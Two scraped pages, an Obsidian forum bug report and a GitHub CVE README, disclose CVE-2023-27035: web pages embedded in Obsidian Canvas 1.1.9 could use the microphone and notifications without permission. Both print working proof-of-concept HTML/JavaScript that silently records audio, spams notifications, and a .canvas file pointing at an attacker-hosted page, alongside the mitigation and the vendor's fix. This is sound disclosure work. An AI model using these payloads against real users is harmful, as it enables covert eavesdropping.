=== Content from forum.obsidian.md_1953aebe_20250115_084337.html ===


![Obsidian Forum](data:image/svg;base64...)
Loading

[Obsidian Forum](/)

# [Embedded web pages in Obsidian Canvas can use sensitive web APIs without the user's permission grant](/t/embedded-web-pages-in-obsidian-canvas-can-use-sensitive-web-apis-without-the-users-permission-grant/54509)

[Bug graveyard](/c/bug-graveyard/12)

[critical](https://forum.obsidian.md/tag/critical),
[repro](https://forum.obsidian.md/tag/repro)

[fivexthree](https://forum.obsidian.md/u/fivexthree)

February 15, 2023, 4:10pm

1

# Description

The attacker can abuse the Obsidian Canvas to silently record the user’s microphone, access the clipboard, send desktop notifications, etc. This could be achieved by embedding the website that contains special JavaScript that uses several Web APIs.

Due to the missing Session Permission Request handler in the Obsidian App user will not receive any notification or permission request from the embedded website.

For example, when this happens in the regular browser, the pop-up is displayed:

![Pasted image 20230215173344](https://forum.obsidian.md/uploads/default/original/3X/a/0/a03ce77c2d975ef1367b7fd117b2cd6785b4ee5d.png)

However, if the website is embedded in Canvas it can access the microphone API without any permission request.

The webpages must explicitly request permissions from the user, otherwise, this poses a significant risk to the user’s privacy.

Vector String - CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N

# Steps to reproduce (Record Audio)

1. Create and host HTML file with following content (the page will record 5 seconds of audio from the microphone and than play it back).

   The demo file is located at <https://obs-demo-poc-serve.s3.amazonaws.com/files/poc1.html>

```
<!DOCTYPE html>
<html lang="en">
<head>
    <title>_</title>
</head>

<body>
    <h1>Make sure your microphone is unmuted.</h1>
    <script>
        // navigator.mediaDevices.enumerateDevices().then((devices) => console.log(devices))
        // credit to https://github.com/bryanjenningz/record-audio
        const recordAudio = () =>
            new Promise(async resolve => {
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: true
                });
                const mediaRecorder = new MediaRecorder(stream);
                const audioChunks = [];

                mediaRecorder.addEventListener("dataavailable", event => {
                    audioChunks.push(event.data);
                });

                const start = () => mediaRecorder.start();

                const stop = () =>
                    new Promise(resolve => {
                        mediaRecorder.addEventListener("stop", () => {
                            const audioBlob = new Blob(audioChunks);
                            const audioUrl = URL.createObjectURL(audioBlob);
                            const audio = new Audio(audioUrl);
                            const play = () => audio.play();
                            resolve({
                                audioBlob,
                                audioUrl,
                                play
                            });
                        });

                        mediaRecorder.stop();
                    });

                resolve({
                    start,
                    stop
                });
            });

        const sleep = time => new Promise(resolve => setTimeout(resolve, time));

        (async () => {
            const recorder = await recordAudio();
            recorder.start();
            await sleep(5000);
            const audio = await recorder.stop();
            audio.play();
        })();
    </script>
</body>
</html>

```

2. Create a blank Canvas and press “Add web page”, insert link to `poc1.html` OR create the following .canvas file (`url` parameter is pointing to our page on the server):

```
{
	"nodes":[{"id":"3cbfdfdb5bd83701","x":-995,"y":355,"width":646,"height":416,"type":"link","url":"https://obs-demo-poc-serve.s3.amazonaws.com/files/poc1.html"}
	"edges":[]
}

```

4. Open the canvas file in Obsidian. The recording will start immediately, after 5 seconds it will be played back.

# Steps to reproduce (Desktop Notifications)

1. Replace HTML file with following and repeat the same steps.

   <https://obs-demo-poc-serve.s3.amazonaws.com/files/poc2.html>

```
<!DOCTYPE html>
<html lang="en">
<head>
    <title>_</title>
</head>
<body>
    <script>
        let i = 0;
        const interval = setInterval(() => {
            const n = new Notification(`Obsidian`, {
                body: 'Notification example.'
            });
            if (i === 10) {
                clearInterval(interval);
            }
            i++;
        }, 500);
    </script>
</body>
</html>

```

2. Open the Canvas file and receive multiple desktop notifications from Obsidian:

   ![Pasted image 20230215144301](https://forum.obsidian.md/uploads/default/original/3X/6/4/644c276473c8d6d3bc9b7480c6f650c43f25d41a.png)

![Pasted image 20230215175251](https://forum.obsidian.md/uploads/default/original/3X/8/1/816aa71d05409cb03f935ae4b6f68004b161c907.png)

# Versions affected

Tested on:

**Ubuntu 20.04.5 LTS**

v.1.1.9, installer v.1.1.9

**Windows 10 PRO 22H2**

v.1.1.9, installer v.1.1.9

# Mitigation

Implement Electron Session Permission Request handler to handle permission requests from the embedded pages. Access to Web APIs must be explicitly granted by the user or denied by default.

Here is the [list](https://www.electronjs.org/docs/latest/api/session#sessetpermissionrequesthandlerhandler) of the permissions from the Electron documentation that are possible to cover with the handler.

[![Pasted image 20230214190340](https://forum.obsidian.md/uploads/default/optimized/3X/6/e/6edf0ad892fbf191281733d87854a08751deee15_2_558x500.png)
Pasted image 20230214190340664×594 81.4 KB](https://forum.obsidian.md/uploads/default/original/3X/6/e/6edf0ad892fbf191281733d87854a08751deee15.png "Pasted image 20230214190340")

# References

* [session | Electron](https://www.electronjs.org/docs/latest/api/session#sessetpermissionrequesthandlerhandler)

3 Likes

[WhiteNoise](https://forum.obsidian.md/u/WhiteNoise)

February 15, 2023, 4:16pm

2

We’ll check this out. Thank you!

1 Like

[Licat](https://forum.obsidian.md/u/Licat)

February 15, 2023, 4:32pm

3

The suggested mitigation has been implemented in code and will be released in the next version (v1.1.14).

1 Like

[fivexthree](https://forum.obsidian.md/u/fivexthree)

February 15, 2023, 5:25pm

4

Great, thank you. Can we request CVE ID for the vulnerability?

[Licat](https://forum.obsidian.md/u/Licat)

February 15, 2023, 6:55pm

5

We aren’t yet participating in CVEs since we’re currently a small team - perhaps a bit later, or if we run into a more serious issue like a no-interaction RCE, we might consider getting one.

By the way, I forgot to mention in my last post but this is a great report! I just wish everyone would write with such details, repro steps and possible mitigations. ![:heart:](https://forum.obsidian.md/images/emoji/apple/heart.png?v=12 ":heart:")

[system](https://forum.obsidian.md/u/system)
Closed

February 22, 2023, 6:55pm

6

This topic was automatically closed 7 days after the last reply. New replies are no longer allowed.

* [Home](/)
* [Categories](/categories)
* [Guidelines](/guidelines)
* [Terms of Service](https://obsidian.md/terms)
* [Privacy Policy](https://obsidian.md/privacy)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



=== Content from github.com_fbc104b9_20250115_084339.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffivex3%2FCVE-2023-27035)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffivex3%2FCVE-2023-27035)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=fivex3%2FCVE-2023-27035)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[fivex3](/fivex3)
/
**[CVE-2023-27035](/fivex3/CVE-2023-27035)**
Public

* [Notifications](/login?return_to=%2Ffivex3%2FCVE-2023-27035) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Ffivex3%2FCVE-2023-27035)
* [Star
   1](/login?return_to=%2Ffivex3%2FCVE-2023-27035)

[1
star](/fivex3/CVE-2023-27035/stargazers) [0
forks](/fivex3/CVE-2023-27035/forks) [Branches](/fivex3/CVE-2023-27035/branches) [Tags](/fivex3/CVE-2023-27035/tags) [Activity](/fivex3/CVE-2023-27035/activity)
 [Star](/login?return_to=%2Ffivex3%2FCVE-2023-27035)

 [Notifications](/login?return_to=%2Ffivex3%2FCVE-2023-27035) You must be signed in to change notification settings

* [Code](/fivex3/CVE-2023-27035)
* [Issues
  0](/fivex3/CVE-2023-27035/issues)
* [Pull requests
  0](/fivex3/CVE-2023-27035/pulls)
* [Actions](/fivex3/CVE-2023-27035/actions)
* [Projects
  0](/fivex3/CVE-2023-27035/projects)
* [Security](/fivex3/CVE-2023-27035/security)
* [Insights](/fivex3/CVE-2023-27035/pulse)

Additional navigation options

* [Code](/fivex3/CVE-2023-27035)
* [Issues](/fivex3/CVE-2023-27035/issues)
* [Pull requests](/fivex3/CVE-2023-27035/pulls)
* [Actions](/fivex3/CVE-2023-27035/actions)
* [Projects](/fivex3/CVE-2023-27035/projects)
* [Security](/fivex3/CVE-2023-27035/security)
* [Insights](/fivex3/CVE-2023-27035/pulse)

# fivex3/CVE-2023-27035

    main[Branches](/fivex3/CVE-2023-27035/branches)[Tags](/fivex3/CVE-2023-27035/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[2 Commits](/fivex3/CVE-2023-27035/commits/main/) | | |
| [README.md](/fivex3/CVE-2023-27035/blob/main/README.md "README.md") | | [README.md](/fivex3/CVE-2023-27035/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2023-27035

CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N

**Vulnerability type:**

Incorrect Access Control

**Description:**

An issue discovered in Obsidian Canvas 1.1.9 allows remote attackers to send desktop notifications, record user audio and other unspecified impacts via embedded website on the canvas page.

**Impact:**

The malicious embedded websites can access sensitive WEB APIs in the Obsidian application without the user's permission and knowledge. For example, they can silently record the user's microphone or send desktop notifications on behalf of the Obsidian application, without user's knowledge or explicit permission grant.

The root cause of this issue is the absence of the Session Permission Request handler in the applicaiton.

**Affected product:**

* Obsidian (Canvas feature)

**Affected versions:**

* 1.1.9 < 1.1.14

**Steps to reproduce:**

1. Create and host HTML file with following content (the page will record 5 seconds of audio from the microphone and than play it back).

```
<!DOCTYPE html>
<html lang="en">
<head>
    <title>_</title>
</head>

<body>
    <h1>Make sure your microphone is unmuted.</h1>
    <script>
        // navigator.mediaDevices.enumerateDevices().then((devices) => console.log(devices))
        // credit to https://github.com/bryanjenningz/record-audio
        const recordAudio = () =>
            new Promise(async resolve => {
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: true
                });
                const mediaRecorder = new MediaRecorder(stream);
                const audioChunks = [];

                mediaRecorder.addEventListener("dataavailable", event => {
                    audioChunks.push(event.data);
                });

                const start = () => mediaRecorder.start();

                const stop = () =>
                    new Promise(resolve => {
                        mediaRecorder.addEventListener("stop", () => {
                            const audioBlob = new Blob(audioChunks);
                            const audioUrl = URL.createObjectURL(audioBlob);
                            const audio = new Audio(audioUrl);
                            const play = () => audio.play();
                            resolve({
                                audioBlob,
                                audioUrl,
                                play
                            });
                        });

                        mediaRecorder.stop();
                    });

                resolve({
                    start,
                    stop
                });
            });

        const sleep = time => new Promise(resolve => setTimeout(resolve, time));

        (async () => {
            const recorder = await recordAudio();
            recorder.start();
            await sleep(5000);
            const audio = await recorder.stop();
            audio.play();
        })();
    </script>
</body>
</html>
```

2. Create a blank Canvas and press “Add web page”, insert link to poc1.html OR create the following .canvas file (url parameter is pointing to our page on the server):

```
{
	"nodes":[{"id":"3cbfdfdb5bd83701","x":-995,"y":355,"width":646,"height":416,"type":"link","url":"https://ATTACKER/files/poc1.html"}],
	"edges":[]
}
```

3. Open the canvas file in Obsidian. The recording will start immediately, after 5 seconds it will be played back.

Notifications PoC:

```
<!DOCTYPE html>
<html lang="en">
<head>
    <title>_</title>
</head>
<body>
    <script>
        let i = 0;
        const interval = setInterval(() => {
            const n = new Notification(`Obsidian`, {
                body: 'Notification example.'
            });
            if (i === 10) {
                clearInterval(interval);
            }
            i++;
        }, 500);
    </script>
</body>
</html>
```

**Mitigation:**

Implement Electron Session Permission Request handler to handle permission requests from the embedded pages. Access to Web APIs must be explicitly granted by the user or denied by default.

**References:**

* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27035>
* <https://forum.obsidian.md/t/embedded-web-pages-in-obsidian-canvas-can-use-sensitive-web-apis-without-the-users-permission-grant/54509>
* <https://forum.obsidian.md/t/obsidian-release-v1-1-14-insider-build/54595>
* <https://www.electronjs.org/docs/latest/api/session#sessetpermissionrequesthandlerhandler>

## About

No description, website, or topics provided.
### Resources

[Readme](#readme-ov-file)

[Activity](/fivex3/CVE-2023-27035/activity)
### Stars

[**1**
star](/fivex3/CVE-2023-27035/stargazers)
### Watchers

[**1**
watching](/fivex3/CVE-2023-27035/watchers)
### Forks

[**0**
forks](/fivex3/CVE-2023-27035/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Ffivex3%2FCVE-2023-27035&report=fivex3+%28user%29)

## [Releases](/fivex3/CVE-2023-27035/releases)

No releases published

## [Packages 0](/users/fivex3/packages?repo_name=CVE-2023-27035)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


